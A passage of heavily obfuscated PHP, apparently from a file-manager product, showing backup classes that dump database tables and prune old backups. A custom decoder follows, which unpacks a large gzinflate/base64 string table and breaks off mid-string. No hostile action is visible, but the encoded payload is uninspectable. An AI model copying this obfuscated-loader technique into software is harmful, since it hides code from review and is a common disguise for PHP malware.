$_SERVER[ìïæ“œî]; $¾á¿Ê¹ü = $…¥‘¥ú[1745]; CacheLock::lock($¾á¿Ê¹ü); $—Ğîã¥“ = Model($…¥‘¥ú[508])->set($Ëİ¥œ£, $šŞâŸ”í, $…¥‘¥ú[1744]); CacheLock::unlock($¾á¿Ê¹ü); return $—Ğîã¥“; } protected static function log($Ÿ›¸‡¨) { write_log($Ÿ›¸‡¨, $_SERVER[ìïæ“œî][1731]); } private static function cacheClear() { $¥Ñ À£‚ =& $_SERVER[ìïæ“œî]; Cache::clearMemory(Model($¥Ñ À£‚[508])->cacheKey($¥Ñ À£‚[1744])); Cache::clearMemory(Model($¥Ñ À£‚[508])->cacheKey($¥Ñ À£‚[1746])); Model($¥Ñ À£‚[1716])->cacheClear(); self::closeDatabase(); } } goto d‹öˆÊ—âµ; A®Ş¸“Ú‰ò: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[ìïæ“œî][797]); $this->init(); $this->keep(); } public function init() { $Î‚«–Òú =& $_SERVER[ìïæ“œî]; $this->isManual(); self::$name = date($Î‚«–Òú[798]); if (!($·¤¥“ŒÙ = $this->model->lastItem())) { $·¤¥“ŒÙ = $this->initData(); } else { self::$name = $·¤¥“ŒÙ[$Î‚«–Òú[32]]; if ($·¤¥“ŒÙ[$Î‚«–Òú[799]] == $Î‚«–Òú[91]) { self::$name = date($Î‚«–Òú[272]); $ˆÅÎÆ¯¸ = intval(_get($·¤¥“ŒÙ, $Î‚«–Òú[800], 0)); if (self::$manual == 0 && $·¤¥“ŒÙ[$Î‚«–Òú[32]] == self::$name) { $this->model->remove($·¤¥“ŒÙ[$Î‚«–Òú[475]]); } $·¤¥“ŒÙ = $this->initData($ˆÅÎÆ¯¸, $·¤¥“ŒÙ[$Î‚«–Òú[801]]); } else { $this->checkStore($·¤¥“ŒÙ[$Î‚«–Òú[801]]); } } self::$option = $·¤¥“ŒÙ; } private function isManual() { $ØğÀÉè‡ = _get($GLOBALS, $_SERVER[ìïæ“œî][802], 0); $ØğÀÉè‡ = intval($ØğÀÉè‡); self::$manual = $ØğÀÉè‡ && $ØğÀÉè‡ == 1 ? 1 : 0; } private function initData($şö¥“ = 0, $óÖŒ©— = '') { $ÇÃÈçò =& $_SERVER[ìïæ“œî]; $’ø¸Ğñî = $this->model->config(); if ($óÖŒ©— && $’ø¸Ğñî[$ÇÃÈçò[801]] != $óÖŒ©—) { $şö¥“ = 0; } $this->checkStore($’ø¸Ğñî[$ÇÃÈçò[801]]); if (self::$manual == 1) { self::$name .= $ÇÃÈçò[11] . date($ÇÃÈçò[803]); } $¶ˆ’ÉÅÚ = array($ÇÃÈçò[801] => $’ø¸Ğñî[$ÇÃÈçò[801]], $ÇÃÈçò[32] => self::$name, $ÇÃÈçò[799] => 0, $ÇÃÈçò[171] => $’ø¸Ğñî[$ÇÃÈçò[171]], $ÇÃÈçò[804] => self::$manual, $ÇÃÈçò[369] => array($ÇÃÈçò[805] => array($ÇÃÈçò[799] => 0), $ÇÃÈçò[806] => array($ÇÃÈçò[799] => 0, $ÇÃÈçò[807] => 0, $ÇÃÈçò[808] => 0, $ÇÃÈçò[33] => $ÇÃÈçò[12], $ÇÃÈçò[809] => 0, $ÇÃÈçò[810] => 0), $ÇÃÈçò[811] => array($ÇÃÈçò[799] => 0, $ÇÃÈçò[807] => 0, $ÇÃÈçò[808] => 0, $ÇÃÈçò[809] => 0, $ÇÃÈçò[810] => 0), $ÇÃÈçò[230] => array($ÇÃÈçò[799] => 0, $ÇÃÈçò[812] => 0, $ÇÃÈçò[813] => 0, $ÇÃÈçò[814] => 0, $ÇÃÈçò[815] => 0, $ÇÃÈçò[541] => $şö¥“, $ÇÃÈçò[809] => 0, $ÇÃÈçò[810] => 0)), $ÇÃÈçò[809] => time(), $ÇÃÈçò[810] => 0); $¢ˆ‹Ì• = $this->model->insert($¶ˆ’ÉÅÚ); $¶ˆ’ÉÅÚ[$ÇÃÈçò[475]] = $¢ˆ‹Ì•; return $¶ˆ’ÉÅÚ; } private function checkStore($‘®¦ëÁõ) { $Ã—û»‰ã = Model($_SERVER[ìïæ“œî][816]); $äæéîÁä = $Ã—û»‰ã->listData($‘®¦ëÁõ); $Ã—û»‰ã->checkConfig($äæéîÁä); } public static function get() { if (!self::$option) { $êï÷ßÚ´ = Model($_SERVER[ìïæ“œî][797]); $æŞ’— = $êï÷ßÚ´->findByName(self::$name); $êï÷ßÚ´->parseContent($æŞ’—); self::$option = $æŞ’—; } return self::$option; } public static function set($§±ññÓÉ) { $Û¨àÃ¾¤ =& $_SERVER[ìïæ“œî]; $—ÍÀ¹õ = self::get(); foreach ($§±ññÓÉ as $”½“Ä¾Æ => $ŞïªÆ«) { array_set_value($—ÍÀ¹õ, $”½“Ä¾Æ, $ŞïªÆ«); } Model($Û¨àÃ¾¤[797])->update($—ÍÀ¹õ[$Û¨àÃ¾¤[475]], $—ÍÀ¹õ); self::$option = $—ÍÀ¹õ; return self::$option; } public function keep() { $å’§†â =& $_SERVER[ìïæ“œî]; $êµµÊí® = self::get(); if (_get($êµµÊí®, $å’§†â[817], 0) == $å’§†â[91]) { return; } $this->backupKeep($êµµÊí®); self::set(array($å’§†â[817] => 1)); } private function backupKeep($¬‡Î¿ß) { $œ¼Ã© =& $_SERVER[ìïæ“œî]; if (self::$manual == 1) { return; } $¡õ¼Š…œ = $this->model->listData(); if (empty($¡õ¼Š…œ)) { return; } $ŸŸõÌğ¥ = 0; $Ñ¸§“î¿ = array(); foreach ($¡õ¼Š…œ as $áºØÁæ) { if ($ŸŸõÌğ¥ >= 7) { break; } $Ñ¸§“î¿[] = $áºØÁæ[$œ¼Ã©[32]]; $ŸŸõÌğ¥++; } for ($ŸŸõÌğ¥ = 0; $ŸŸõÌğ¥ < 12; $ŸŸõÌğ¥++) { $Ñ¸§“î¿[] = date($œ¼Ã©[818], strtotime("\55{$ŸŸõÌğ¥}\40\155\x6f\156\x74\150\x73")); } $Ñ¸§“î¿ = array_unique($Ñ¸§“î¿); $è¼òôÔ¡ = Model($œ¼Ã©[819])->get($œ¼Ã©[820]); foreach ($¡õ¼Š…œ as $áºØÁæ) { if (isset($áºØÁæ[$œ¼Ã©[804]]) && $áºØÁæ[$œ¼Ã©[804]] == $œ¼Ã©[91]) { continue; } if (!empty($áºØÁæ[$œ¼Ã©[32]]) && in_array($áºØÁæ[$œ¼Ã©[32]], $Ñ¸§“î¿)) { continue; } $this->model->remove($áºØÁæ[$œ¼Ã©[475]]); $Üš·„¬ = $this->backupPath($¬‡Î¿ß, $è¼òôÔ¡); IO::remove($Üš·„¬, !1); } } private function backupPath($Ğ‘óû¬, $Õ‡›âŞ• = false) { $Ğ¹‹«æÂ =& $_SERVER[ìïæ“œî]; if (!$Õ‡›âŞ•) { $Õ‡›âŞ• = Model($Ğ¹‹«æÂ[819])->get($Ğ¹‹«æÂ[820]); } $‘ó›¨íÕ = $Ğ‘óû¬[$Ğ¹‹«æÂ[32]]; $Ü¯±«¼§ = substr(md5($Ğ¹‹«æÂ[821] . $Õ‡›âŞ• . $‘ó›¨íÕ), 0, 8); return "\173\x69\x6f\72{$Ğ‘óû¬[$Ğ¹‹«æÂ[801]]}\175\57\x64\141\x74\x61\142\141\x73\x65\x2f\x62\141\143\153\x75\160\57" . $‘ó›¨íÕ . $Ğ¹‹«æÂ[11] . $Ü¯±«¼§; } public function db() { $‘öŠïòÜ =& $_SERVER[ìïæ“œî]; $Óˆö¾óğ = self::get(); if (_get($Óˆö¾óğ, $‘öŠïòÜ[822], 0) == $‘öŠïòÜ[91]) { return !0; } $ŞØ¥¯ü· = new BackupDb(); if (!$ŞØ¥¯ü·->index()) { return !1; } self::set(array($‘öŠïòÜ[822] => 1)); return !0; } public function dbFile() { $ë“ç·· =& $_SERVER[ìïæ“œî]; $½Öó±Ÿ = self::get(); if (_get($½Öó±Ÿ, $ë“ç··[823], 0) == $ë“ç··[91]) { return !0; } $¯¨ÏáßÔ = new BackupDbFile(); if (!$¯¨ÏáßÔ->index()) { return !1; } self::set(array($ë“ç··[823] => 1)); return !0; } public function file() { $åÇÒØ¶× =& $_SERVER[ìïæ“œî]; $…ÅÛêçØ = self::get(); if (_get($…ÅÛêçØ, $åÇÒØ¶×[824], 0) == $åÇÒØ¶×[91]) { return !0; } if ($…ÅÛêçØ[$åÇÒØ¶×[171]] == $åÇÒØ¶×[825]) { $À­Ø—¢› = new BackupFile(); if (!$À­Ø—¢›->index()) { return !1; } } self::set(array($åÇÒØ¶×[824] => 1, $åÇÒØ¶×[799] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $¿ÍÎšÂò =& $_SERVER[ìïæ“œî]; $À¨›‚ï€ = Backup::get(); self::$io = $À¨›‚ï€[$¿ÍÎšÂò[801]]; self::$name = $À¨›‚ï€[$¿ÍÎšÂò[32]]; $×ä„ğ„˜ = new DbManage(); $úé¾Éùã = $×ä„ğ„˜->dbType(); $ô°‡ßü¨ = array($¿ÍÎšÂò[826] => $úé¾Éùã, $¿ÍÎšÂò[827] => time()); Backup::set($ô°‡ßü¨); $¥”ü®ÍÍ = $this->tmpFilesPath() . $¿ÍÎšÂò[828] . self::$name . $¿ÍÎšÂò[8]; del_dir($¥”ü®ÍÍ); mk_dir($¥”ü®ÍÍ); $š¤”– = $üíêœ¹Ñ = 0; try { $µØíø = $×ä„ğ„˜->db()->getTables(); } catch (Exception $áÜ×Èä¡) { return !1; } $µØíø = array_diff($µØíø, array($¿ÍÎšÂò[829], $¿ÍÎšÂò[830])); foreach ($µØíø as $ø•Âú¬) { $š¤”– += $×ä„ğ„˜->model($ø•Âú¬)->count(); } $òÁ½ˆÜ— = new Task($¿ÍÎšÂò[831], $¿ÍÎšÂò[832], $š¤”–, LNG($¿ÍÎšÂò[833]) . $¿ÍÎšÂò[834] . LNG($¿ÍÎšÂò[835])); $GLOBALS[$¿ÍÎšÂò[836]] = self::$name; foreach ($µØíø as $ø•Âú¬) { $ÎşÒéª = $¥”ü®ÍÍ . $ø•Âú¬ . $¿ÍÎšÂò[837]; $áø½œâ¸ = null; if ($ø•Âú¬ == $¿ÍÎšÂò[838] && (!isset($À¨›‚ï€[$¿ÍÎšÂò[171]]) || $À¨›‚ï€[$¿ÍÎšÂò[171]] == $¿ÍÎšÂò[228])) { $áø½œâ¸ = self::$io; } $üíêœ¹Ñ += $×ä„ğ„˜->sqlFromDb($ø•Âú¬, $ÎşÒéª, $òÁ½ˆÜ—, $áø½œâ¸); } unset($GLOBALS[$¿ÍÎšÂò[836]]); $òÁ½ˆÜ—->end(); if ($üíêœ¹Ñ > $š¤”–) { $š¤”– = $üíêœ¹Ñ; } $ô°‡ßü¨ = array($¿ÍÎšÂò[826] => $úé¾Éùã, $¿ÍÎšÂò[822] => 1, $¿ÍÎšÂò[839] => $š¤”–, $¿ÍÎšÂò[840] => $üíêœ¹Ñ, $¿ÍÎšÂò[841] => time()); Backup::set($ô°‡ßü¨); if ($š¤”– - $üíêœ¹Ñ > 0) { $•ãÑß–Æ = $¿ÍÎšÂò[842]; if (!stristr(I18n::getType(), $¿ÍÎšÂò[843])) { $•ãÑß–Æ = $¿ÍÎšÂò[844]; } write_log(array($•ãÑß–Æ, $ô°‡ßü¨), $¿ÍÎšÂò[832]); return !1; } return !0; } private function tmpFilesPath() { $Ïåï—Ê« =& $_SERVER[ìïæ“œî]; $·è½šº = TEMP_FILES; if ($GLOBALS[$Ïåï—Ê«[6]][$Ïåï—Ê«[92]][$Ïåï—Ê«[845]]) { $·è½šº = $GLOBALS[$Ïåï—Ê«[6]][$Ïåï—Ê«[92]][$Ïåï—Ê«[845]]; if (!mk_dir($·è½šº) || !is_writable($·è½šº) || !IO::mkfile($·è½šº . $Ïåï—Ê«[846])) { $·è½šº = TEMP_FILES; } } return $·è½šº; } } class BackupDbFile { public function __construct() { } public function index() { $–Í¸ ¹¿ =& $_SERVER[ìïæ“œî]; $”àÁîÃ = Backup::get(); $…´·”âœ = $”àÁîÃ[$–Í¸ ¹¿[32]]; $œÈ™»ù¬ = $this->tmpFilesPath() . "\142\x61\x63\x6b\x75\160\x5f{$…´·”âœ}\x2f"; $Ù·Ÿê¶ƒ = $this->backupPath($”àÁîÃ); if (!($Ù·Ÿê¶ƒ = IO::mkdir($Ù·Ÿê¶ƒ))) { return !1; } $ñø¨•ı° = IO::listPath($œÈ™»ù¬); $ïŠ¿Ôš = isset($ñø¨•ı°[$–Í¸ ¹¿[86]]) ? $ñø¨•ı°[$–Í¸ ¹¿[86]] : array(); $Î¯”‰’¸ = array_sum(array_column($ïŠ¿Ôš, $–Í¸ ¹¿[79])); if (!$Î¯”‰’¸) { return !1; } $ƒğ¤•¬ = array($–Í¸ ¹¿[847] => $Î¯”‰’¸, $–Í¸ ¹¿[848] => time()); Backup::set($ƒğ¤•¬); $÷ÍœŞ¬ = new TaskFileTransfer($–Í¸ ¹¿[849], $–Í¸ ¹¿[832], count($ïŠ¿Ôš), LNG($–Í¸ ¹¿[833]) . $–Í¸ ¹¿[462] . LNG($–Í¸ ¹¿[835]) . $–Í¸ ¹¿[850]); $÷ÍœŞ¬->task[$–Í¸ ¹¿[812]] = $Î¯”‰’¸; foreach ($ñø¨•ı°[$–Í¸ ¹¿[86]] as $ú¿™ó¾) { $ê±äéûœ = IO::move($ú¿™ó¾[$–Í¸ ¹¿[87]], $Ù·Ÿê¶ƒ); if (!$ê±äéûœ) { $÷ÍœŞ¬->end(); $ôÈÖ¾Ê† = IO::getLastError($–Í¸ ¹¿[851] . $ú¿™ó¾[$–Í¸ ¹¿[87]] . $–Í¸ ¹¿[852] . $Ù·Ÿê¶ƒ . $–Í¸ ¹¿[178]); write_log($ôÈÖ¾Ê†, $–Í¸ ¹¿[832]); return !1; } } $¾‘¦½İÚ = new DbManage(); $ï™´ùÅ = $¾‘¦½İÚ->getSqlFile(); if (!$ï™´ùÅ[$–Í¸ ¹¿[853]] || !$ï™´ùÅ[$–Í¸ ¹¿[13]]) { return !1; } IO::move($ï™´ùÅ[$–Í¸ ¹¿[853]], $Ù·Ÿê¶ƒ); IO::move($ï™´ùÅ[$–Í¸ ¹¿[13]], $Ù·Ÿê¶ƒ); $÷ÍœŞ¬->end(); $ƒğ¤•¬ = array($–Í¸ ¹¿[854] => $Î¯”‰’¸, $–Í¸ ¹¿[855] => time()); Backup::set($ƒğ¤•¬); return !0; } private function backupPath($ªİ“‚Ôü) { $§ŸºˆÆÄ =& $_SERVER[ìïæ“œî]; $˜‹…¨¡ = $ªİ“‚Ôü[$§ŸºˆÆÄ[32]]; $¶¶“ÜÒÊ = Model($§ŸºˆÆÄ[819])->get($§ŸºˆÆÄ[820]); $ÍÙàĞ§± = substr(md5($§ŸºˆÆÄ[821] . $¶¶“ÜÒÊ . $˜‹…¨¡), 0, 8); return "\x7b\x69\x6f\x3a{$ªİ“‚Ôü[$§ŸºˆÆÄ[801]]}\x7d\57\144\141\x74\x61\x62\141\x73\145\x2f\x62\x61\143\x6b\165\160\57" . $˜‹…¨¡ . $§ŸºˆÆÄ[11] . $ÍÙàĞ§±; } private function tmpFilesPath() { $ïı™ŒÂ =& $_SERVER[ìïæ“œî]; $Ç¸èıî½ = TEMP_FILES; if ($GLOBALS[$ïı™ŒÂ[6]][$ïı™ŒÂ[92]][$ïı™ŒÂ[845]]) { $Ç¸èıî½ = $GLOBALS[$ïı™ŒÂ[6]][$ïı™ŒÂ[92]][$ïı™ŒÂ[845]]; if (!mk_dir($Ç¸èıî½) || !is_writable($Ç¸èıî½) || !IO::mkfile($Ç¸èıî½ . $ïı™ŒÂ[846])) { $Ç¸èıî½ = TEMP_FILES; } } return $Ç¸èıî½; } } goto d”Êø¤óáÀ; DÖ¿ˆªáâº: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xec\xef\xe6\x93\x9c\xee", "\xcb\x9b\xe1\xd4\xa8\xce"); $_SERVER[ìïæ“œî] = explode("\x7c\x2\x7c\x2\x7c\x4", gzinflate(substr(base64_decode('H4sIAAAAAAAAE8V9CXhbxbUw26NspTxC4VEK3JgkthMtjrM7cRJZlm0R2XIkOZttlCvp2g==')."\272\261\244\253\350\136\171\311\102\331\102\130\222\0\205\204\55\120\50\245\100\131\22\266\44\204\255\154\205\266\360\240\245\5\122\150\113\233\330\111\50\205\102\13\205\226\345\237\345\314\162\257"."\144\170\377\367\376\357\373\3\211\146\71\63\167\226\63\147\316\234\71\163\316\225\133\16\374\175\357\115\153\16\103\377\35\161\311\333\177\277\374\117\127\322\60\371\357\110\32\76\363\362\243\16"."\41\177\306\134\176\131\125\125\313\364\143\46\265\35\167\305\103\367\252\207\66\354\370\344\331\207\136\334\372\233\267\137\374\111\54\65\167\367\326\336\63\16\361\247\257\10\327\41\120\132\262\216"."\xfe\x28\x39\xc3\x52\xb4\x41\xdd\xb4\x4c\x9a\x90\x34\x72\x3d\x7a\x2f\xd\xeb\x39\xfa\xeb\xa5\x3f\x1d\x91\x50\x41\xcb\x1a\x96\x46\xa3\x1e\xfa\x13\x87\x56\x91\x7f\xcd\x95\x19\x9d\xe5\xc7\xdb\xc2\xb1\x78\xb4\xa3"."\275\75\20\211\1\120\235\234\237\65\122\20\312\253\5\65\13\337\317\153\5\23\265\106\256\56\236\67\362\132\316\226\42\22\122\252\245\46\124\23\152\152\154\210\67\6\332\103\341\245\361\330"."\322\366\0\100\44\342\53\213\132\141\210\306\110\60\152\251\5\53\246\147\65\16\61\120\340\355\152\10\64\7\333\224\130\304\327\26\365\371\143\301\160\33\115\366\207\133\133\203\261\322\364\110"."\x38\x14\x6a\xf0\xf9\x17\x94\xe6\xb4\x47\x7c\xcd\xad\x3e\x5\xb5\x2f\xa3\xc5\xf5\x5c\x8f\x51\xa5\x2c\xa7\x39\xcb\x95\x6a\x1a\x68\xd2\xb5\x4c\x8a\x6\x73\x2a\x6b\x8e\x35\x94\x87\x50\x8c\x87\xd0\x34\xe5\x8a\x99"."\14\215\264\361\120\112\353\121\213\31\30\255\106\71\222\57\350\131\225\165\172\201\66\304\123\151\100\55\132\206\236\113\322\110\140\320\52\250\42\35\265\65\211\46\132\313\101\125\321\100\50\340"."\x8f\x29\xb8\x81\x4a\x53\x24\xdc\xaa\xc0\x24\x64\x55\xd3\xd2\xa\xca\xe2\x96\x40\x24\xa0\xe0\x46\xd7\x57\x92\xbe\x56\x2a\x80\x2f\x6d\x68\x28\x14\x5f\x28\xa4\x8c\x56\x83\xa5\x65\xf3\xac\x1a\x5a\xa6\x4c\x65\xe1".strrev('RÅ´üL–¡-Îƒ¢š›„ˆ4 ¡Ş€\\„H©©-&h-PyÈÖl%ÄU,4¢ cH').base64_decode('PRkr3q9migxN++hvJfzAr2EC6q7Uc3oR0BSqMAy+rCBQZNAaS9FSEMii8gaUS0BagkGtYA==').base64_decode('AR2t0H4arJ9Lf2dD+UQc52kFK67lkkZKz8E6ngf4qFrpxoKOAGi8x8ikWNjUV0Eve/SM1g==').base64_decode('VszKIDyaTOuZVIEtva+CpNEQX8kYVsTyqCVrGBHQe4bEUsRw7TzXNIqFpBZES4fGJ0OyZg==')."\131\250\163\154\100\214\216\174\306\120\123\121\255\300\273\246\33\115\250\242\160\321\222\23\213\4\254\311\50\144\33\21\321\200\357\243\5\243\167\224\311\350\143\113\46\45\215\230\267\252\363\174"."\367\27\335\235\363\321\77\325\100\25\273\240\115\151\55\223\211\153\203\32\254\251\154\152\232\311\6\303\153\46\364\234\27\245\320\150\60\34\117\253\146\272\65\65\55\116\112\101\223\163\51\155"."\320\223\117\347\151\124\254\366\56\33\316\343\241\153\63\254\200\104\262\63\106\122\315\310\135\244\341\264\145\345\243\132\56\205\107\2\272\142\14\344\310\110\345\65\15\200\32\135\112\112\151\125"."\x96\x2a\x2d\x75\x7a\x9d\xc9\xa\x66\x33\x3c\xc4\x7a\xc7\xd3\x4c\x9e\x68\xd\xb2\xe9\x4c\xf5\x0\xb6\xb2\x1d\xa3\x2\x3e\xa8\x9b\x84\xf8\x89\x95\xab\xe6\xf3\x19\x3d\xa9\x5a\xba\x91\xf3\x1a\x49\x4b\xb3\xdc\xa6"."\x55\xd0\x54\xa8\xd1\x97\x4c\x6a\xa6\xe9\xf6\x1b\x39\xab\x60\x64\xdc\xbe\x4c\xc6\x18\x70\x87\xb\x7a\xaf\x9e\xab\x53\x26\x52\x18\x9c\x89\xd6\xbb\x1b\xd3\xc6\x3a\x58\xc4\x15\xb3\x15\x8c\x38\xf8\x33\x13\xeb\x8b"."\x56\x8f\x7b\x26\x5b\x9c\x1c\xba\xa0\xe6\xcc\x1e\xad\xe0\xe\xc0\xca\xa8\x53\x50\x63\x39\x81\x64\x60\x8d\xba\x99\x37\x4c\x1d\x37\xaf\x4e\x51\x2d\x4b\x4d\xa6\x31\x71\x11\xd5\xd7\x7f\x5\xbc\x9e\xcb\xe8\x39\xad"."\x14\x16\x55\xa2\xb9\xdb\xb\x6a\x6f\x56\xad\x53\xf2\xc5\x4\x1a\x0\x58\x90\x90\x96\xc4\x10\x32\x30\xc\x40\x9d\x92\x55\x7\xdd\x6a\x2f\xab\x29\x30\x98\xd7\xb\x9a\xc9\x7a\xad\x34\xb7\xc6\x0\xa3\x7a\xdc\xad"."\170\41\351\132\312\35\105\324\33\52\233\122\63\125\101\270\242\260\74\232\332\22\213\265\307\203\115\150\173\156\13\304\133\175\61\177\13\324\156\251\275\254\352\20\242\311\274\112\226\270\304\215"."\26\24\306\246\66\324\71\221\330\156\14\150\5\364\341\206\241\72\245\317\110\45\214\101\17\313\302\300\121\104\131\30\60\236\337\274\345\216\250\271\136\334\215\304\220\245\1\316\11\332\324\200"."\66\163\117\17\135\275\236\204\326\143\24\240\67\146\177\257\175\360\103\132\256\327\112\263\272\243\201\310\242\100\44\36\15\67\305\26\373\42\260\367\347\20\346\14\262\326\340\257\147\334\21\55".strrev('¤¼ƒC4Älx³İÇVzCº±C-È›tk±ã6'."\n".'–"/,ãø0^7şŒ^jr±i1…')."\317\365\135\346\304\252\256\324\244\152\67\372\167\142\165\147\127\243\147\142\367\74\257\56\312\170\47\173\46\53\265\65\323\225\166\304\251\350\152\106\201\116\227\100\324\50\341\5\366\141\21\30"."\x9e\x33\x72\x5a\xd9\x85\x85\x10\xc9\x30\x35\x77\x8b\xa6\x22\x22\x8d\x26\xc2\x36\x2f\x2e\xf6\x2d\x1a\xff\x8a\xd1\xc5\x7b\xa5\x44\x4b\x1c\xf3\x42\x13\x23\x81\x85\x1d\x81\x68\x2c\xde\x1a\x88\xb5\x84\x1b\xa1\xf9".base64_decode('AR+EcqgwaS+bY8yY0SAaYwgMSnuI2AuS8oCQcm3GwBqg/g4E8qe1ZN8oeSgEvTEoXWJT1w==')."\x49\x7f\xba\x1\x9b\xbb\xe9\x4f\x5c\x37\x9b\xa4\x7d\x13\x47\x39\x7d\x8d\x1b\x89\x15\x8\xb3\x5a\x35\xb6\x89\xc0\x97\x82\x59\xb4\x86\x45\xcb\xe3\xf6\x4d\x8e\x75\xab\x55\x60\x3a\x5a\x32\x8b\xf5\x14\xdf\x5\x51".base64_decode('tEXTe9PQUB1XlzQyRkHNYNrPGNdeHchwPlNEeO/FFcfSxWwCdio0Rr2aJXhKcwgxXkB5EQ==').base64_decode('C44GMwjTAvsuxLxxjKtdnnyut3oc1BWvnVaDE2AaoWeIuS5qpV33JA20sFvVPq0O9wWo2Q==')."\x6c\x92\xca\x22\x12\xc1\x9c\x8d\xf7\xb8\x7a\x27\x5d\xc0\xd3\x93\xf1\x64\x51\x25\xa4\x4e\xbf\xc1\x77\x65\x7a\x7c\x1\x26\x88\xed\x71\x8a\x56\x28\x18\x85\xb1\x0\x41\xc2\xa\xd9\x28\xf1\x74\x41\xe5\x16\x67\x3b".strrev('è)Ñ¼àÆIO5‚ jDd¹T©ª $Ğ´ÇšìB‘²m¯~…çXÈ`Å6pm8XDL').strrev('1­(°ÆŒ´¦±îò*½SC-´ÄÂ$™ÀË½YI¥²è’Ùûº)iù²P¶Ê¬Œ§é±')."\6\242\6\300\320\360\163\34\353\341\310\216\216\10\50\125\160\156\272\31\101\45\361\166\317\342\213\361\231\112\44\140\236\7\220\107\4\63\150\352\302\144\325\210\170\173\101\353\321\201\152\347"."\xd0\xea\x6f\x55\xb\x7d\xac\x63\xa8\xa4\x58\x6f\x38\x22\xad\xc5\xa6\x8e\x50\x28\xee\xf\xb7\xc5\xd0\x91\x8c\xa6\x2c\x8e\x4\x63\x40\xab\x22\x88\xe6\xc4\x7d\xfe\x76\x88\x9\xca\xc6\xd9\x32\x99\xb1\xa0\x29\xfd".base64_decode('tYAnqBFewQGhLThv5BD9BBLkFge2kqyUYBAAQQRT4eAT0E6fXeXOIuLh5m2ys2cKbPeUyw==')."\xb\xc2\x34\xa5\xf8\xe4\xe0\xc1\x43\xb\x99\xf1\x85\xed\xe1\x28\x14\x98\x87\x53\x11\x6f\x9e\xe0\xeb\xad\xbd\x3\xb2\xb2\x12\x8a\x34\x7\x20\xf1\x18\xc0\xaa\xb4\xa\x1c\xb7\x6f\x71\x94\x6d\xe1\x45\x4\x5f\xd0"._kodDe('LJtJPZRK5UptpDmzC83c120lCCZRDM8k2Am2rJhMTXBvpmlJt18tPyyMT2c/TLelZgtdtYE=')."\60\16\230\123\343\5\15\21\34\366\241\332\32\250\111\303\134\222\324\274\245\356\254\33\327\202\107\320\123\123\123\303\352\232\64\135\111\43\72\267\206\355\46\51\62\113\354\334\125\114\366\261".strrev('j©§£Œé'."\n".'…*ËB‘å4U£Tqcø“WNÉU~û8Ïb•ÆŸ<Ê3 =Ów‹ë&£')."\246\27\15\272\225\316\312\211\142\342\151\134\243\354\41\237\73\76\212\170\154\355\70\56\67\51\157\40\206\24\272\261\244\154\33\226\224\153\303\22\107\33\226\224\266\201\46\231\172\157\16\365"."\x92\x6d\x6e\x30\x1d\xcd\x78\x3a\xa4\x69\xb5\x4d\xf3\x60\x1c\x15\x8c\xc3\x1a\x8a\xcb\x5d\x81\x41\x82\x6e\xc8\x39\x2d\x9c\x9a\xb1\x4e\xb6\x36\x4e\x63\xed\xf0\xb5\x2e\x73\x37\xfa\x18\x2d\x98\x33\xf\xa1\xa8\xd2".base64_decode('jyVNRq6+crKnplJhJ+b6yo5YEzo/zJt7zBy/kc1jwtiKD4l4CdGD4lxYHnMwb8Yi7XyF0Q==')."\x78\x20\xa6\xc2\xe6\x38\xc7\x2b\xc3\xcd\xf1\x8e\x56\x2b\x20\x5b\x56\x5d\x65\xe4\x10\x7a\xa3\x4d\x33\xeb\x49\x2\xe\x63\x36\x94\xef\x41\x38\x62\xf2\x58\xac\x25\xd8\xb6\x20\xde\x1a\x6e\xc\x84\xe2\xc1\x36\xc4"."\247\305\112\323\73\332\105\347\345\364\206\160\254\305\226\332\201\70\265\105\276\120\320\11\36\130\22\214\306\242\145\263\120\132\107\300\221\323\330\20\157\217\4\232\202\113\170\264\51\30\10\65"."\106\343\176\237\277\105\300\264\371\132\41\202\130\42\55\223\62\275\166\370\70\142\71\243\134\234\26\207\11\203\230\115\202\25\147\262\231\270\240\305\350\370\242\1\2\103\167\261\100\222\364\44"."\316\26\175\221\63\220\354\254\236\145\233\55\72\172\301\214\260\163\107\25\375\251\126\174\121\305\312\103\35\150\133\115\14\361\40\351\6\213\43\146\3\276\257\0\373\133\322\202\70\206\151\220"."\xe\x39\xe5\x13\x7c\x3d\x16\x67\x38\x1d\x71\xb4\x89\x88\x3c\x34\x3\x3e\x22\xf9\x44\x98\x40\x66\x4\x3e\xa3\xa3\x2d\xa9\x60\xf9\x58\x73\x7a\x84\xd4\x31\x1e\x6e\xf\x44\x7c\x58\x66\x19\x5f\x1c\x9\xb7\x35\x43".base64_decode('gYG0xhoQhOGvYqdOEF1aYmdXM7rKZFhi0FcYbCgn0B904GYsfY4NdwJzN4yvZYEetB4YZw==')."\142\24\371\147\22\206\1\125\147\360\71\153\15\333\161\271\314\163\205\311\260\143\220\355\325\223\326\260\75\1\160\66\274\40\320\26\147\50\105\143\22\32\322\204\100\44\22\216\300\110\130\106".strrev('À±u¼eÇ—X…|âz Qºy\'ºuU&ºsŞóàâb¾€I¼œlèÿ¼I¶Ê HÌÑw“')."\113\343\245\136\145\316\253\256\353\362\166\171\253\346\325\165\372\334\253\124\367\252\32\367\54\167\67\342\310\253\47\101\102\367\352\132\327\324\265\30\0\1\316\73\253\33\375\324\167\315\33\337".base64_decode('5Z5w7vL5nV3dlXWTxnZ5zuoa6J5YPY99J1ksIKafkX7U1NSkKtQkdCzlIDmJohEAlrFKzw==')."\x8b\xd4\xd5\xd3\xd7\xb2\x74\x34\x87\x5a\xaf\x28\xd1\xe9\xee\x9a\xd4\x3d\x4f\x2a\x27\x25\x39\xbf\x85\xb6\x24\xc4\xc0\xa4\x39\x9c\xcf\xbd\xc\xf7\x8c\x17\xc5\xb\x1e\xf0\xa3\x98\x4b\x8a\xfd\x1d\x2f\x88\x84\xca"."\xcf\x77\xbd\x39\x71\x8e\xb2\xa\x5c\x6\xda\x8f\x90\x54\x6c\x56\xab\xc7\xd3\xdf\xb5\x6c\x22\x7b\x35\x58\xed\xe4\xfe\xa3\x0\xd8\x59\xcc\xe9\x2b\xd9\x81\x26\xa7\xad\x84\x80\x61\x31\xc4\x4e\x68\xd6\x80\xc6\xd0"."\x3\xa5\xdb\xe2\x8\x39\xd8\x6\x8a\xb2\xa4\x58\x46\xda\x7c\x89\